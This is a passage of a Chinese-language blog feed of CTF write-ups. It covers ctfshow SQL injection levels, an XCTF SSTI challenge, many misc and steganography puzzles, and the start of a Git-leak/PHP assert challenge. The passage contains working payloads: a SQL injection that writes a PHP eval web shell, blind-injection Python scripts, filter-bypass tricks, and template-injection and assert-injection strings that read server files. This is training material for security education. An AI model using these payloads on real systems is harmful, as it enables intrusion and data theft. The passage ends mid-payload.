class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,&quot;&lt;?php eval(@$_POST[1]); ?&gt;&quot; into outfile &#x27;/var/www/html/1.php&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240417194755829.png" alt="image-20240417194755829"></p><h3 id="177"><a href="#177" class="headerlink" title="177"></a>177</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username=&#x27;flag&#x27;%23</span><br></pre></td></tr></table></figure><p>- </p><h3 id="182"><a href="#182" class="headerlink" title="182"></a>182</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cor%0cusername%0clike&#x27;%la%</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;or(mid(username,1,1)=&#x27;f&#x27;)and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h3 id="183"><a href="#183" class="headerlink" title="183"></a>183</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br></pre></td></tr></table></figure><p>pass应该就是password，去匹配ctfshow来查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://064788b5-2abd-4bed-8177-8aa66e6477bb.challenge.ctf.show/select-waf.php&quot;</span><br><span class="line"></span><br><span class="line">flagstr = &quot;ctfshow&#123;abdegijklmnpqruvxyz-0123456789&#125;&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(0, 50):</span><br><span class="line">    for x in flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;tableName&quot;: &quot;`ctfshow_user`where`pass`like&#x27;ctfshow&#123;&#125;%&#x27;&quot;.format(flag + x)</span><br><span class="line">            # &quot;tableName&quot;: &quot;`ctfshow_user`where`pass`regexp(&#x27;ctfshow&#123;&#125;&#x27;)&quot;.format(flag + x)</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        if (response.text.find(&quot;$user_count = 1;&quot;) &gt; 0):</span><br><span class="line">            flag += x</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h3 id="184"><a href="#184" class="headerlink" title="184"></a>184</h3><p>分组查询语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 [WHERE 条件] GROUP BY [HAVING 分组后过滤条件]</span><br></pre></td></tr></table></figure><p>where和having的区别：where是分组之前进行过滤，不满足where条件，不参与分组;而having是分组之后对结果进行过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://92152998-9415-41b7-911d-88bdaca6fbbe.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;&#123;abcdefghijklmnopqrstuvwxyz-0123456789&#125;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    a = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        a+= <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">&quot;ctfshow_user group by pass having pass regexp(0x&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(to_hex(flag + x))</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span>(response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>):</span><br><span class="line">            flag += x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ctfshow&#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="185"><a href="#185" class="headerlink" title="185"></a>185</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">strs</span>):</span><br><span class="line">    t=<span class="string">&#x27;concat(&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> strs:</span><br><span class="line">       t+= <span class="string">&#x27;char(true&#x27;</span>+<span class="string">&#x27;+true&#x27;</span>*(<span class="built_in">ord</span>(s)-<span class="number">1</span>)+<span class="string">&#x27;),&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> t[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://48fae3d2-6175-476d-a180-10a9ddaa0823.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">s = <span class="string">&#x27;0123456789abcdef-&#123;&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        d = convert(<span class="string">f&#x27;^ctfshow<span class="subst">&#123;flag + j&#125;</span>&#x27;</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">f&#x27; ctfshow_user group by pass having pass regexp(<span class="subst">&#123;d&#125;</span>)&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;user_count = 1&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="sql绕过总结"><a href="#sql绕过总结" class="headerlink" title="sql绕过总结"></a>sql绕过总结</h2><h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><ul><li><code>%20</code>: 空格</li><li><code>%09</code>: 水平制表符（Tab）</li><li><code>%0A</code>: 换行符（LF）</li><li><code>%0B</code>: 垂直制表符</li><li><code>%0C</code>: 换页符（FF）</li><li><code>%0D</code>: 回车符（CR）</li><li><code>%A0</code>: 不间断空格（NBSP）</li><li><code>%00</code>: 空字符（NULL)</li><li>&#x2F;**&#x2F; ，()，&#96;，tab，两个空格</li></ul><p>注意在使用()绕过的时候，括号里边不能有*号</p><p><img src="/img/image-20240418112900178.png" alt="image-20240418112900178"></p><h3 id="or-and-xor-not-过滤绕过"><a href="#or-and-xor-not-过滤绕过" class="headerlink" title="or and xor not 过滤绕过"></a>or and xor not 过滤绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and = &amp;&amp; or = ||　　xor = | # 　　not = !</span><br></pre></td></tr></table></figure><h3 id="号过滤绕过"><a href="#号过滤绕过" class="headerlink" title="&#x3D;号过滤绕过"></a>&#x3D;号过滤绕过</h3><p>1、<code>like</code>，&#x3D;号和不加通配符的 like 是一样的</p><p><img src="/img/image-20240418112828379.png" alt="image-20240418112828379"></p><p>2、还可以使用 <code>!&lt; &gt;</code>号来绕过，&lt;&gt; 在mysql中等于!&#x3D; 如果在加一个! 双重否定代表肯定 就是&#x3D;了</p><p><img src="/img/image-20240418112843033.png" alt="image-20240418112843033"></p><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web</title>
      <link href="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb.html"/>
      <url>/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb.html</url>
      
        <content type="html"><![CDATA[<h2 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h2><p><img src="/img/image-20231019211535114.png" alt="image-20231019211535114"></p><p>login.php中Ctrl+U查看页面源码发现flag路径</p><p><img src="/img/image-20231019211606001.png" alt="image-20231019211606001"></p><p>login.php4测试ssti漏洞</p><p><img src="/img/image-20231019211630276.png" alt="image-20231019211630276"></p><p>测试pyaload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231019211702087.png" alt="image-20231019211702087"></p><p>被过滤了</p><p>参数替换payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[request.args.a][request.args.b][2][request.args.c]()[40](&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;)[request.args.d]()&#125;&#125;?&amp;a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231019211752275.png" alt="image-20231019211752275"></p><p>cyberpeace{6df74ab602e50a9c41d5bb417cb241ed} </p><h2 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界misc</title>
      <link href="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc.html"/>
      <url>/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc.html</url>
      
        <content type="html"><![CDATA[<h2 id="Banmabanma"><a href="#Banmabanma" class="headerlink" title="Banmabanma"></a>Banmabanma</h2><p>打开是张png图片，条形码，直接在线解码</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/image-20231012201650145.png" alt="image-20231012201650145"></h2><p><img src="/img/image-20231012234119565-1697249980732-5.png" alt="image-20231012234119565"></p><p>stesolve打开</p><p><img src="/img/image-20231012234237210-1697249987950-7.png" alt="image-20231012234237210"></p><p>winhex打开，ctrl+r选择转换方式</p><p><img src="/img/image-20231012234321087.png" alt="image-20231012234321087"></p><p>发现.py,flag</p><p><img src="/img/image-20231012232615491.png" alt="image-20231012232615491"></p><p>保存为pyc后缀,在线网站反编译</p><p><img src="/img/image-20231012234501702.png" alt="image-20231012234501702"></p><p><img src="/img/image-20231012234519542.png" alt="image-20231012234519542"></p><h3 id="心仪的公司"><a href="#心仪的公司" class="headerlink" title="心仪的公司"></a>心仪的公司</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings webshell.pcapng |grep &#123;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231012235913529.png" alt="image-20231012235913529"></p><h2 id="pure-color"><a href="#pure-color" class="headerlink" title="pure_color"></a>pure_color</h2><p><img src="/img/image-20231014102045432.png" alt="image-20231014102045432"></p><p><img src="/img/image-20231014102055075.png" alt="image-20231014102055075"></p><h2 id="2017-Dating-in-Singapore"><a href="#2017-Dating-in-Singapore" class="headerlink" title="2017_Dating_in_Singapore"></a>2017_Dating_in_Singapore</h2><p>按中间的-分隔数字，刚好是12行，都是十进制数，不足10的在前面补0，将数字按顺序在图中标出来，发现flag</p><p><img src="/img/image-20231014102107390.png" alt="image-20231014102107390"></p><p><img src="/img/image-20231014102116944.png" alt="image-20231014102116944"></p><h2 id="simple-transfer"><a href="#simple-transfer" class="headerlink" title="simple_transfer"></a>simple_transfer</h2><p>下载是个.pcap文件</p><p>分离发现pdf，建议使用foremost，因为用binwalk发现pdf损坏</p><p><img src="/img/image-20231014102125672.png" alt="image-20231014102125672"></p><p>直接打开pdf<br><img src="/img/image-20231014102132634.png" alt="image-20231014102132634"></p><p>HITB{b3d0e380e9c39352c667307d010775ca}</p><h2 id="Training-Stegano-1"><a href="#Training-Stegano-1" class="headerlink" title="Training-Stegano-1"></a>Training-Stegano-1</h2><p>下载是个bmp文件</p><p>bmp：Windows操作系统中的标准图像文件格式<br>图片上就一个点，很抽象，结合题目描述：这是我能想到的最基础的图片隐写术</p><p><img src="/img/image-20231014102142609.png" alt="image-20231014102142609"></p><p>直接010打开或者notepad++都行</p><p><img src="/img/image-20231014102150964.png" alt="image-20231014102150964"></p><p>flag：steganoI</p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p>下载解压后是</p><p><img src="/img/image-20231014102157969.png" alt="image-20231014102157969"></p><p>直接记事本打开</p><p><img src="/img/image-20231014102206942.png" alt="image-20231014102206942"></p><p>brainfuck在线解释器：<a href="http://esoteric.sange.fi/brainfuck/impl/interp/i.html">http://esoteric.sange.fi/brainfuck/impl/interp/i.html</a></p><p><img src="/img/image-20231014102213269.png" alt="image-20231014102213269"></p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><p>010打开发现png头，就改后缀为png，放到stesolve里面也没什么发现，ok，不会了</p><p>看了wp发现竟然这里有hint</p><p><img src="/img/image-20231014102223894.png" alt="image-20231014102223894"></p><p>中间居然有个二维码</p><p><img src="/img/image-20231014102240809.png" alt="image-20231014102240809"></p><p>直接扫不出来，wp说可以使用ps将两个比较清晰的二维码拼成一个完整的直接扫，但我没有ps。010打开，文件末尾有一个网站可以下载一个图片，然后使用python脚本</p><p><img src="/img/image-20231014102249670.png" alt="image-20231014102249670"></p><p>那个图片下不来，但是知道后面只要用python脚本跑一下</p><p>其他解法：<a href="https://blog.csdn.net/m0_56161093/article/details/122471779">https://blog.csdn.net/m0_56161093/article/details/122471779</a></p><h2 id="Janos-the-Ripper"><a href="#Janos-the-Ripper" class="headerlink" title="János-the-Ripper"></a>János-the-Ripper</h2><p>没什么好说的，直接改成.zip后缀，密码爆破即可。</p><p>发现这里面的题目普遍不给文件后缀</p><h2 id="Test-flag-please-ignore"><a href="#Test-flag-please-ignore" class="headerlink" title="Test-flag-please-ignore"></a>Test-flag-please-ignore</h2><p>打开</p><p><img src="/img/image-20231014102255899.png" alt="image-20231014102255899"></p><p>直接16进制转字符串</p><h2 id="hong"><a href="#hong" class="headerlink" title="hong"></a>hong</h2><p>解压后是MP3格式，但是用音频软件打不开，那就分离试试<br><img src="/img/image-20231014102303639.png" alt="image-20231014102303639"></p><p>第一张图片扫码后是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">03f30d0ad41db4576300000000000000000100000040000000730d0000006400008400005a00006401005328020000006300000000030000000700000043000000734b0000006401006402006403006404006405006406006407006707007d00006408007d0100781e007c0000445d16007d02007c01007400007c0200830100377d0100712800577c010047486400005328090000004e694d0000006972000000692e0000006948000000696f000000696e0000006967000000740000000028010000007403000000636872280300000074030000007374727404000000666c6167740100000069280000000028000000007304000000612e7079520300000001000000730a00000000011b0106010d0114024e280100000052030000002800000000280000000028000000007304000000612e707974080000003c6d6f64756c653e010000007300000000</span><br></pre></td></tr></table></figure><p>是”适合作为桌面”那一题的解法，但是修改代码并运行发现不是flag</p><p><img src="/img/image-20231014102309670.png" alt="image-20231014102309670"></p><p><img src="/../../../../source/img/image-20231013190250746.png" alt="image-20231013190250746"></p><p>另一张图片</p><p><img src="/img/image-20231014102314485.png" alt="image-20231014102314485"></p><h2 id="misc-pic-again"><a href="#misc-pic-again" class="headerlink" title="misc_pic_again"></a>misc_pic_again</h2><p>一张png图片</p><p><img src="/img/image-20231014102318984.png" alt="image-20231014102318984"></p><p>lsb隐写，藏了一个zip文件，保存出来，解压出来是一个1文件，然后嘞，010搜flag发现没有，其实搜索词应该是hctf，或者{</p><p><img src="/img/image-20231014102323424.png" alt="image-20231014102323424"></p><h3 id="reverseMe"><a href="#reverseMe" class="headerlink" title="reverseMe"></a>reverseMe</h3><p><img src="/img/image-20231014102328059.png" alt="image-20231014102328059"></p><p><img src="/img/image-20231014102332111.png" alt="image-20231014102332111"></p><h2 id="hit-the-core"><a href="#hit-the-core" class="headerlink" title="hit-the-core"></a>hit-the-core</h2><p>.core文件，直接strings查找字符，这里就考验细心了，XCTF每个相隔4个字符</p><p><img src="/img/image-20231014102337066.png" alt="image-20231014102337066"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">num=&#x27;cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in  range(3,len(num),5):</span><br><span class="line">   flag += num[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><p>打开是一个抽象的gif？？？</p><p><img src="/img/image-20231014102341590.png" alt="image-20231014102341590"></p><p>这题的意思就是把每一帧按从左往右拼接起来就是flag，wp有人是用kali的convert和montage，或者是python脚本，但是直接网站一键分解即可<br>gif动态图分解：<a href="https://tu.sioe.cn/gj/fenjie/">https://tu.sioe.cn/gj/fenjie/</a><br><img src="/img/image-20231014102351099.png" alt="image-20231014102351099"></p><p>只能说nb，TWCTF{Bliss by Charles O’Rear}</p><h2 id="normal-png"><a href="#normal-png" class="headerlink" title="normal_png"></a>normal_png</h2><p>一张图片</p><p><img src="/img/image-20231014102354834.png" alt="image-20231014102354834"></p><p>发现crc不对，可能是图片高度有问题</p><p><img src="/img/image-20231014102359985.png" alt="image-20231014102359985"></p><p><img src="/img/image-20231014102404554.png" alt="image-20231014102404554"></p><p><img src="/img/image-20231014102407779.png" alt="image-20231014102407779"></p><h2 id="-4"><a href="#-4" class="headerlink" title=""></a></h2><p>题目是一个gif，010打开，发现末尾是类似base的字符，解码两次出flag</p><p><img src="/img/image-20231014102411866.png" alt="image-20231014102411866"></p><p>密钥是ISCC</p><p><img src="/img/image-20231014102416825.png" alt="image-20231014102416825"></p><h2 id="a-good-idea"><a href="#a-good-idea" class="headerlink" title="a_good_idea"></a>a_good_idea</h2><p>rar文件解压出</p><p><img src="/img/image-20231014102423169.png" alt="image-20231014102423169"></p><p>hint.txt: try to find the secret of pixels</p><p>我们使用stegsolve联合两个图片</p><p><img src="/img/image-20231014102426754.png" alt="image-20231014102426754"></p><p>然后save保存，再用stegsolve打开，发现二维码</p><p><img src="/img/image-20231014102430712.png" alt="image-20231014102430712"></p><p><img src="/img/image-20231014102436557.png" alt="image-20231014102436557"></p><p>NCTF{m1sc_1s_very_funny!!!}</p><h2 id="Ditf"><a href="#Ditf" class="headerlink" title="Ditf"></a>Ditf</h2><p>打开是一张图片，010打开发现尾部不是png尾，说明里面有东西，foremost分解出来</p><p><img src="/img/image-20231014102444072.png" alt="image-20231014102444072"></p><p><img src="/img/image-20231014102449510.png" alt="image-20231014102449510"></p><p>但其实一开始是有发现图片的高度不对，CRC爆破发现</p><p><img src="/img/image-20231014102452465.png" alt="image-20231014102452465"></p><p>是rar的密码，输入密码</p><p><img src="/img/image-20231014102456694.png" alt="image-20231014102456694"></p><p>记事本打开</p><p><img src="/img/image-20231014102502694.png" alt="image-20231014102502694"></p><p><img src="/img/image-20231014102505203.png" alt="image-20231014102505203"></p><h2 id="miss-01"><a href="#miss-01" class="headerlink" title="miss_01"></a>miss_01</h2><p>解压，唉？</p><p><img src="/img/image-20231014102510764.png" alt="image-20231014102510764"></p><p><img src="/img/image-20231014102514979.png" alt="image-20231014102514979"></p><p>docx是空的，我们再看看zip文件，是wav，但是要密码</p><p><img src="/img/image-20231014102517921.png" alt="image-20231014102517921"></p><p>问题就是zip文件损坏，扔到zip修复大师修复后打开，打开docx，题目名是miss，所以想到有没有隐藏字符<img src="/img/image-20231014102527984.png" alt="image-20231014102527984"></p><p><img src="/img/image-20231014102531130.png" alt="image-20231014102531130"></p><p>确实是有</p><p><img src="/img/image-20231014102535844.png" alt="image-20231014102535844"></p><p>搜一下这个线索waoootu.epj,<a href="https://so.csdn.net/so/search?q=nv&spm=1001.2101.3001.7020">nv</a> o，得到线索是希尔加密，密钥就是<a href="http://www.verymuch.net/">www.verymuch.net</a></p><p><img src="/img/image-20231014102540449.png" alt="image-20231014102540449"></p><p>加密出来的密码是rabbit的密码，进行解密</p><p><img src="/img/image-20231014102544352.png" alt="image-20231014102544352"></p><p>base32解码</p><p><img src="/img/image-20231014102547691.png" alt="image-20231014102547691"></p><p><img src="/../../../../source/img/image-20231014010200653.png" alt="image-20231014010200653"></p><p>变成新佛曰编码</p><p><img src="/img/image-20231014102550848.png" alt="image-20231014102550848"></p><p>fun.zip解压密码：Live beautifully, dream passionately, love completely.</p><p>打开音频文件，显示频谱图</p><p><img src="/img/image-20231014102554145.png" alt="image-20231014102554145"></p><p><img src="/img/image-20231014102557925.png" alt="image-20231014102557925"></p><p>flag{m1sc_1s_funny2333}</p><p>##m0_01</p><p>解压是12.pcapng，试着foremost，不行，用wireshark打开</p><p><img src="/img/image-20231014105840050.png" alt="image-20231014105840050"></p><p>usb流量分析，第一次接触这种题，我们来了解一下一些基础知识</p><p>USB协议数据在Leftover Capture Data域中，鼠标流量数据长度为四个字节，键盘流量数据长度为八个字节。</p><p>鼠标流量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一个字节：代表按键（00时,代表没有按键；01时,代表按左键；02时,代表当前按键为右键）</span><br><span class="line">第二个字节：值为正时，代表鼠标右移像素位；</span><br><span class="line">值为负时，代表鼠标左移像素位</span><br><span class="line">第三个字节：代表垂直上下移动的偏移（当值为正时，代表鼠标上移像素位；值为负时，代表鼠标下移像素位）</span><br></pre></td></tr></table></figure><p>随便打开一个数据包查看Leftover Capture Data域，图示是8字节，所以是键盘流量</p><p><img src="/img/image-20231014110211471.png" alt="image-20231014110211471"></p><p>使用kali，在wireshark的tshark工具下将数据提取为文本文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r 12.pcapng -T fields -e usb.capdata&gt;1.txt</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231014110545953.png" alt="image-20231014110545953"></p><p>使用键盘流量脚本破解</p><p><img src="/img/image-20231014110517932.png" alt="image-20231014110517932"></p><p>这段数字只有01248，是云影密码</p><p><img src="/img/image-20231014110703004.png" alt="image-20231014110703004"></p><p>flag{THISISFLAG}</p><p>usb流量分析学习：<a href="https://blog.csdn.net/qq_46150940/article/details/115431953">https://blog.csdn.net/qq_46150940/article/details/115431953</a></p><h2 id="津门杯2021-m1"><a href="#津门杯2021-m1" class="headerlink" title="津门杯2021-m1"></a>津门杯2021-m1</h2><p>这题纯纯因为对密码编码不够熟悉，看到base都没有发现</p><p><img src="/img/image-20231014113752658.png" alt="image-20231014113752658"></p><h2 id="流量分析1"><a href="#流量分析1" class="headerlink" title="流量分析1"></a>流量分析1</h2><p>感觉需要计网的知识，不然有点懵</p><h2 id="misc2-1"><a href="#misc2-1" class="headerlink" title="misc2-1"></a>misc2-1</h2><p>解压打开是一张图片，但是损坏，不能打开，我们使用010打开看看，这样是逆序的图片</p><p><img src="/img/image-20231015130428752.png" alt="image-20231015130428752"></p><p>正常应该是</p><p><img src="/img/image-20231015130456154.png" alt="image-20231015130456154"></p><p>使用脚本恢复</p><p><img src="/img/image-20231015130558879.png" alt="image-20231015130558879"></p><h2 id="Let-god-knows"><a href="#Let-god-knows" class="headerlink" title="Let_god_knows"></a>Let_god_knows</h2><p><img src="/img/image-20231015131638056.png" alt="image-20231015131638056"></p><p>开头两个字节是BM，说明是bmp格式的图片</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>刷题</title>
      <link href="/%E5%88%B7%E9%A2%98.html"/>
      <url>/%E5%88%B7%E9%A2%98.html</url>
      
        <content type="html"><![CDATA[<h3 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h3><p>Git是一个版本控制系统，在配置不当的情况下，可能会导致<code>.git</code>文件夹被直接部署到线上环境中，这可能会导致Git泄露问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> <span class="number">1</span><span class="string">&#x27;) or system(&#x27;</span>cat+./templates/flag.php<span class="string">&#x27;);// . &quot;.php&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// I heard &#x27;</span>..<span class="string">&#x27; is dangerous!</span></span><br><span class="line"><span class="string">assert(&quot;strpos(&#x27;</span><span class="variable">$file</span><span class="string">&#x27;, &#x27;</span>..<span class="string">&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// TODO: Make this look nice</span></span><br><span class="line"><span class="string">assert(&quot;file_exists(&#x27;</span><span class="variable">$file</span><span class="string">&#x27;)&quot;) or die(&quot;That file doesn&#x27;</span>t exist!<span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">```</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=&#x27;) or system(&#x27;cat ./templates/flag.php&#x27;);//</span><br></pre></td></tr></table></figure><p>传入之后变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file=&quot;templates/&#x27;) or 